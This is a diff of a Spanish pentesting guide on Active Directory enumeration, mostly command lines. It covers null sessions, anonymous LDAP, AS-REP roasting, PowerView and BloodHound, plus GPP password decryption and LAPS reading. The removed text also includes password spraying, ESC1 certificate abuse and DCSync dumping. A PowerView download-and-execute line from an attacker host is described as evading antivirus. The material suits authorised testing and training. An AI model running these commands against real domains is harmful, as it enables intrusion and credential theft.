@@ -4,216 +4,288 @@ icon: windows
 
 # Enumeración
 
-### 1. Identificación Inicial sin credenciales
+La enumeración es la fase más importante en un pentest de AD. Cuanta más información se recopile, más rutas de ataque se descubren. Se divide en dos fases: sin credenciales (desde fuera o con acceso de red) y con credenciales (con una cuenta de dominio, aunque sea de bajo privilegio).
 
-_Objetivo: Identificar el Controlador de Dominio (DC), el nombre del dominio y posibles vectores de entrada anónimos._
+### Enumeración sin credenciales
 
-#### Reconocimiento de Red
-
-Descubrir IPs y puertos clave (53, 88, 135, 139, 389, 445, 636).
+#### DNS — Descubrir el dominio
 
 ```bash
-# Escaneo rápido de puertos AD comunes
-nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 <IP_Rango>
+# Descubrir el DC por DNS
+nmap -p 53 --script dns-srv-enum --script-args dns-srv-enum.domain=empresa.local 10.10.10.0/24
 
-# Identificar nombre de dominio y DC por NetBIOS/SMB
-nxc smb <IP_DC>
-enum4linux-ng -U <IP_DC>
+# Query SRV records del dominio
+nslookup -type=SRV _ldap._tcp.empresa.local
+nslookup -type=SRV _kerberos._tcp.empresa.local
+nslookup -type=SRV _kpasswd._tcp.empresa.local
+
+# Dig equivalente
+dig SRV _ldap._tcp.empresa.local
+dig SRV _kerberos._tcp.empresa.local @10.10.10.10
+
+# Zone transfer (si está mal configurado)
+dig axfr empresa.local @10.10.10.10
 ```
 
-#### Enumeración Anónima / Null Session
-
-Intentar listar usuarios o recursos sin contraseña.
+#### SMB — Null sessions y shares
 
 ```bash
-# LDAP Anónimo (listar todo el directorio si es posible)
-ldapsearch -x -H ldap://<IP_DC> -b "DC=empresa,DC=local"
+# Enumerar con null session (sin credenciales)
+smbclient -L //10.10.10.10 -N
+smbclient //10.10.10.10/SYSVOL -N
+smbclient //10.10.10.10/NETLOGON -N
 
-# Enumeración SMB (Null Session)
-smbclient -L //<IP_DC> -N
+# CrackMapExec / NetExec
+nxc smb 10.10.10.10
+nxc smb 10.10.10.0/24          # Descubrir hosts SMB en la red
+nxc smb 10.10.10.10 --shares -u '' -p ''   # Null session
 
-# RPC Client (Null Session - intentar conectar sin usuario)
-rpcclient -U "" <IP_DC> -N
-> enumdomusers       # Listar usuarios
-> querydominfo       # Info del dominio
+# Enum4linux (herramienta legacy pero útil)
+enum4linux -a 10.10.10.10
+enum4linux-ng -A 10.10.10.10   # Versión mejorada
+
+# rpcclient con null session
+rpcclient -U "" -N 10.10.10.10
+rpcclient> enumdomusers         # Listar usuarios
+rpcclient> enumdomgroups        # Listar grupos
+rpcclient> querydominfo         # Info del dominio
+rpcclient> getdompwinfo         # Política de contraseñas
 ```
 
-#### User Hunting (RID Cycling)
-
-Si no tenemos usuarios, intentamos descubrirlos mediante fuerza bruta de IDs.
-
-```
-# Usando Kerbrute (Validar usuarios existentes sin bloquear cuentas)
-kerbrute userenum --dc <IP_DC> -d <dominio.local> users_list.txt
-
-# Usando NetExec (RID Brute force)
-nxc smb <IP_DC> -u "guest" -p "" --rid-brute 10000
-```
-
-### 2. Validación de Credenciales & Password Spraying
-
-_Objetivo: Conseguir un usuario válido para realizar enumeración autenticada._
-
-{% hint style="warning" %}
-El Password Spraying puede bloquear cuentas
-{% endhint %}
+#### LDAP — Consultas anónimas
 
 ```bash
-# Obtener política de contraseñas (para ver intentos fallidos permitidos)
-nxc smb <IP_DC> -u "usuario" -p "password" --pass-pol
+# ldapsearch sin autenticación
+ldapsearch -x -H ldap://10.10.10.10 -b "DC=empresa,DC=local"
+ldapsearch -x -H ldap://10.10.10.10 -b "" -s base "(objectclass=*)"
 
-# Password Spraying (Probar 1 password contra muchos usuarios)
-nxc smb <IP_DC> -u users.txt -p "Summer2023!" --continue-on-success
+# Usuarios con ldapsearch anónimo
+ldapsearch -x -H ldap://10.10.10.10 -b "DC=empresa,DC=local" "(objectClass=user)" sAMAccountName
 
-# AS-REP Roasting (Usuarios que no requieren pre-autenticación Kerberos)
-# ¡Esto puede darte un hash sin tener credenciales previas!
-impacket-GetNPUsers <dominio>/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
+# Nmap LDAP scripts
+nmap -p 389 --script ldap-rootdse 10.10.10.10
+nmap -p 389 --script ldap-search 10.10.10.10
 ```
 
-### 3. Enumeración estando autenticado
-
-Teniendo un usuario/password comprometido, mapear la estructura completa del AD. Herramientas: Impacket, NetExec, Windapsearch.
-
-#### Enumeración Básica de Usuarios y Grupos
+#### AS-REP — Usuarios sin preautenticación Kerberos (sin creds)
 
 ```bash
-# Listar todos los usuarios del dominio con descripciones (útil para encontrar passwords en comentarios)
-nxc smb <IP_DC> -u <user> -p <pass> --users
+# Kerbrute — enumerar usuarios válidos por Kerberos
+kerbrute userenum -d empresa.local --dc 10.10.10.10 /usr/share/wordlists/usernames.txt
 
-# Listar grupos del dominio
-nxc smb <IP_DC> -u <user> -p <pass> --groups
-
-# Buscar usuarios Administradores de Dominio
-impacket-lookupsid <dominio>/<user>:<pass>@<IP_DC> | grep "Domain Admins"
+# Impacket — AS-REP Roasting sin credenciales (usuarios conocidos)
+impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt
 ```
 
-#### Búsqueda de SPNs (Kerberoasting)
+### Enumeración con credenciales
 
-Técnica crítica. Buscar cuentas de servicio para crackear sus hashes TGS.
+Con cualquier cuenta de dominio (aunque sea sin privilegios) se puede enumerar casi todo el AD.
 
-```bash
-# Solicitar TGS para cuentas con SPN
-impacket-GetUserSPNs <dominio>/<user>:<pass> -request -outputfile hashes.kerberoast
-
-# Crackear con Hashcat
-hashcat -m 13100 hashes.kerberoast wordlist.txt
-```
-
-***
-
-### 4. Enumeración Profunda (Desde Windows / PowerShell)
-
-Si tienes acceso a una máquina en el dominio, usa herramientas nativas o scripts de PowerShell. Herramientas: PowerView (PowerSploit), ADModule.
-
-#### Cargar PowerView en memoria
+#### PowerView (PowerShell — desde Windows)
 
 ```powershell
- PS> IEX(New-Object Net.WebClient).DownloadString('http://<IP_Atacante>/PowerView.ps1')
+# Importar
+Import-Module .\PowerView.ps1
+# O en memoria (evade AV)
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
+
+# Info general del dominio
+Get-Domain
+Get-DomainController
+Get-DomainPolicy
+(Get-DomainPolicy)."system access"   # Política de contraseñas
+
+# Usuarios
+Get-DomainUser                                     # Todos los usuarios
+Get-DomainUser -Identity admin                     # Usuario específico
+Get-DomainUser -Properties samaccountname,memberof,description,pwdlastset,lastlogon
+Get-DomainUser | Where-Object {$_.description -ne $null}   # Usuarios con descripción (a veces contiene credenciales)
+Get-DomainUser -SPN                                # Usuarios con SPN (→ Kerberoasting)
+Get-DomainUser -PreauthNotRequired                 # Usuarios sin preauth (→ AS-REP Roasting)
+
+# Grupos
+Get-DomainGroup                                    # Todos los grupos
+Get-DomainGroup -Identity "Domain Admins"          # Grupo específico
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # Miembros recursivos
+Get-DomainGroup | Where-Object {$_.membercount -gt 0}
+
+# Equipos
+Get-DomainComputer
+Get-DomainComputer -Properties dnshostname,operatingsystem
+Get-DomainComputer | Where-Object {$_.operatingsystem -like "*Server*"}
+
+# OUs
+Get-DomainOU
+Get-DomainOU -Properties name,gplink
+
+# GPOs
+Get-DomainGPO
+Get-DomainGPO -Identity "{GUID}"
+Get-DomainGPOLocalGroup        # GPOs que modifican grupos locales
+
+# Shares
+Find-DomainShare                    # Todas las shares del dominio
+Find-DomainShare -CheckShareAccess  # Solo las accesibles con las credenciales actuales
+
+# Sesiones y logons activos (requiere admin en los equipos objetivo)
+Get-NetSession -ComputerName DC01
+Get-NetLoggedon -ComputerName WS01
+Find-DomainUserLocation -UserIdentity admin  # Dónde está logueado un usuario
+
+# Trusts
+Get-DomainTrust
+Get-ForestTrust
 ```
 
-#### Enumeración de Usuarios y Grupos (PowerView)
+#### ACLs con PowerView
 
 ```powershell
-# Información básica del usuario actual
-Get-NetUser
+# ACLs sobre un objeto específico
+Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs
 
-# Buscar un usuario específico
-Get-NetUser -Identity "admin_user"
+# Buscar ACLs interesantes para un usuario
+Get-DomainObjectACL -ResolveGUIDs | Where-Object {
+    $_.SecurityIdentifier -eq (Get-DomainUser usuario).objectsid
+}
 
-# Listar miembros del grupo Domain Admins
-Get-NetGroupMember -Identity "Domain Admins"
+# ACLs abusables (GenericAll, WriteDACL, etc.)
+Get-DomainObjectACL -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword"
+} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier
 
-# Listar todos los ordenadores del dominio
-Get-NetComputer
+# Find-InterestingDomainAcl → busca ACLs no predeterminadas sobre objetos de alto valor
+Find-InterestingDomainAcl -ResolveGUIDs
 ```
 
-#### Enumeración de Permisos y ACLs
-
-Buscar quién puede modificar a quién (ej. Reset Password, WriteDacl).
-
-```powershell
-# Ver ACLs de un objeto específico
-Get-ObjectAcl -Identity "Administrator" -ResolveGUIDs
-
-# Buscar GPOs (Políticas de Grupo) interesantes
-Get-NetGPO | select displayname, whenchanged
-
-# Buscar computadoras donde soy Admin Local (Derivada de GPO/Grupos)
-Find-LocalAdminAccess
-```
-
-#### Búsqueda de Shares y Archivos
-
-Buscar archivos con contraseñas (web.config, scripts, txt).
-
-PowerShell
-
-```powershell
-# Buscar shares legibles en la red
-Invoke-ShareFinder -CheckShareAccess
-
-# Buscar archivos con "pass" o "secret" en el nombre
-Invoke-FileFinder -Pattern "pass"
-```
-
-***
-
-### 5. Mapeo Visual de Rutas de Ataque (BloodHound)
-
-Automatizar el descubrimiento de relaciones complejas (quién es admin de qué). Herramienta Definitiva: BloodHound.
-
-#### Recolección de Datos (Ingestor)
-
-Opción A: Desde Linux (Python - no requiere unirse al dominio)
+#### Impacket (desde Linux)
 
 ```bash
-# Recolectar datos (All: usuarios, grupos, sesiones, trusts, etc.)
-bloodhound-python -u <user> -p <pass> -ns <IP_DC> -d <dominio> -c All
+# Enumerar usuarios
+impacket-GetADUsers -all empresa.local/usuario:contraseña -dc-ip 10.10.10.10
+
+# Enumerar SPNs (→ Kerberoasting)
+impacket-GetUserSPNs empresa.local/usuario:contraseña -dc-ip 10.10.10.10
+
+# Obtener usuarios sin preauth (→ AS-REP Roasting)
+impacket-GetNPUsers empresa.local/usuario:contraseña -dc-ip 10.10.10.10
+
+# Consultas LDAP
+ldapsearch -x -H ldap://10.10.10.10 -D "usuario@empresa.local" -w "contraseña" \
+    -b "DC=empresa,DC=local" "(objectClass=user)" sAMAccountName memberOf description
 ```
 
-Opción B: Desde Windows (SharpHound.exe)
-
-```powershell
-# Ejecutar SharpHound
-.\SharpHound.exe --CollectionMethods All
-```
-
-#### Análisis&#x20;
-
-Cargar el .zip generado y ejecutar queries predefinidas:
-
-1. Find Principals with DCSync Rights: Quién puede volcar hashes del dominio.
-2. Shortest Paths to Domain Admins: La ruta más rápida para ser DA.
-3. Find Workstations where Domain Users can RDP: Dónde podemos movernos lateralmente.
-
-### 6. Active Directory Certificate Services (AD CS)
-
-Objetivo: Explotar infraestructuras de PKI mal configuradas (ESC1 - ESC8). Herramienta: Certipy.
+#### NetExec / CrackMapExec (desde Linux)
 
 ```bash
-# Enumerar plantillas de certificados vulnerables
-certipy find -u <user>@<dominio> -p <pass> -dc-ip <IP_DC> -vulnerable
+# Usuarios del dominio
+nxc smb 10.10.10.10 -u usuario -p contraseña --users
 
-# Si encuentras vulnerabilidad (ej. ESC1), solicitar certificado
-certipy req -u <user>@<dominio> -p <pass> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<dominio>
+# Grupos
+nxc smb 10.10.10.10 -u usuario -p contraseña --groups
 
-# Autenticarse con el certificado para obtener hash NTLM
-certipy auth -pfx administrator.pfx -dc-ip <IP_DC>
+# Equipos
+nxc smb 10.10.10.10 -u usuario -p contraseña --computers
+
+# Shares accesibles
+nxc smb 10.10.10.10 -u usuario -p contraseña --shares
+
+# Políticas de contraseña
+nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol
+
+# Sesiones activas
+nxc smb 10.10.10.10 -u usuario -p contraseña --sessions
+
+# Loggeados actualmente
+nxc smb 10.10.10.10 -u usuario -p contraseña --loggedon-users
+
+# RDP activo
+nxc rdp 10.10.10.0/24 -u usuario -p contraseña
+
+# WinRM disponible
+nxc winrm 10.10.10.0/24 -u usuario -p contraseña
 ```
 
-### 7. Post-Explotación de Dominio (Dumping)
-
-Una vez eres Domain Admin, extraer todo.
-
-
+#### BloodHound — Enumeración visual
 
 ```bash
-# DCSync (Volcar todos los hashes del dominio - Requiere ser DA o tener privilegios DCSync)
-impacket-secretsdump <dominio>/<admin_user>:<pass>@<IP_DC>
+# Recolectar datos con BloodHound.py (desde Linux)
+bloodhound-python -u usuario -p contraseña -d empresa.local -ns 10.10.10.10 -c all
 
-# Volcar ntds.dit (base de datos de AD)
-# 1. Crear Shadow Copy (vssadmin)
-# 2. Copiar ntds.dit y SYSTEM registry
-# 3. Extraer offline con impacket
-impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+# Recolectar datos con SharpHound (desde Windows)
+.\SharpHound.exe -c All --zipfilename output.zip
+.\SharpHound.exe -c All,GPOLocalGroup --stealth
+
+# Importar en BloodHound
+# Abrir BloodHound → Upload Data → seleccionar ZIP generado
 ```
+
+Queries útiles en BloodHound:
+
+```
+Find all Domain Admins
+Find Shortest Path to Domain Admins
+Find Principals with DCSync Rights
+Find Computers where Domain Users are Local Admin
+Find AS-REP Roastable Users
+Find Kerberoastable Users with most privileges
+Shortest Paths from Kerberoastable Users
+```
+
+#### Enumerar SYSVOL y GPP
+
+```bash
+# Buscar contraseñas en SYSVOL (GPP passwords — CVE-2014-1812)
+smbclient //10.10.10.10/SYSVOL -U "empresa.local\usuario%contraseña"
+# Buscar manualmente: groups.xml, scheduledtasks.xml, services.xml
+
+# Automático con netexec
+nxc smb 10.10.10.10 -u usuario -p contraseña -M gpp_password
+
+# Automático con impacket
+impacket-Get-GPPPassword -xmlfile groups.xml
+
+# Con PowerView
+Get-GPPPassword
+
+# Descifrar cpassword manualmente (AES-256, clave pública de Microsoft)
+gpp-decrypt CPASSWORD_VALUE
+```
+
+#### Enumeración de LAPS
+
+```bash
+# Verificar si LAPS está instalado
+nxc smb 10.10.10.10 -u usuario -p contraseña -M laps
+
+# Leer contraseñas LAPS (si se tienen permisos)
+nxc ldap 10.10.10.10 -u usuario -p contraseña -M laps
+
+# Con PowerView
+Get-DomainComputer -Properties dnshostname,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
+    Where-Object {$_."ms-mcs-admpwd" -ne $null}
+```
+
+### Checklist
+
+```
+□ Identificar DC(s) y nombre del dominio
+□ Enumerar todos los usuarios del dominio
+□ Buscar usuarios con descripción que contenga credenciales
+□ Buscar usuarios con SPN (Kerberoasting)
+□ Buscar usuarios sin preautenticación Kerberos (AS-REP Roasting)
+□ Enumerar grupos privilegiados y sus miembros
+□ Enumerar equipos (OS, hostname, sesiones activas)
+□ Enumerar shares y buscar archivos sensibles
+□ Enumerar GPOs y sus permisos
+□ Analizar ACLs con BloodHound
+□ Buscar contraseñas en SYSVOL (GPP)
+□ Verificar si LAPS está activo y si podemos leerlo
+□ Enumerar trusts entre dominios
+□ Identificar rutas de ataque en BloodHound
+```
+
+> Una cuenta de dominio sin privilegios es suficiente para enumerar casi todo AD via LDAP. La enumeración completa no requiere ser admin.
+
+> Revisar siempre el campo description de los usuarios de AD — es sorprendentemente común encontrar contraseñas ahí dejadas por administradores.
+
+> BloodHound + SharpHound/bloodhound-python es la herramienta más potente para encontrar rutas de ataque que serían imposibles de descubrir manualmente.
